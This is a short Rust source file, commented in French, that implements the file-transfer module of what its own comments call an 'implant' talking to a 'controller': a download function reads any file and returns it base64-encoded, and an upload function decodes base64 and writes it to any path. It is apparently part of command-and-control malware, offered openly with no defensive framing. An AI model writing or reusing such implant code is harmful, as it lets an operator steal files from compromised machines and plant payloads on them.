// Transfert de fichiers bidirectionnel entre controller et implant.
// download <chemin>  → lit le fichier et retourne son contenu en base64 (préfixe FILE:)
// upload <dest> <b64> → décode et écrit sur disque
use base64::Engine;
use std::fs;

pub fn download(path: &str) -> String {
    let p = path.trim();
    if p.is_empty() {
        return "download <chemin>".to_string();
    }
    match fs::read(p) {
        Ok(bytes) => format!(
            "FILE:{}",
            base64::engine::general_purpose::STANDARD.encode(&bytes)
        ),
        Err(e) => format!("[err] {}: {}", p, e),
    }
}

pub fn upload(args: &str) -> String {
    // args: "<dest_path> <base64_contenu>"
    let (dest, b64) = match args.trim().split_once(' ') {
        Some(pair) => pair,
        None => return "upload <dest> <base64_contenu>".to_string(),
    };
    match base64::engine::general_purpose::STANDARD.decode(b64.trim()) {
        Ok(bytes) => match fs::write(dest.trim(), &bytes) {
            Ok(()) => format!("[ok] {} octets écrits → {}", bytes.len(), dest.trim()),
            Err(e) => format!("[err] écriture: {}", e),
        },
        Err(e) => format!("[err] décodage base64: {}", e),
    }
}
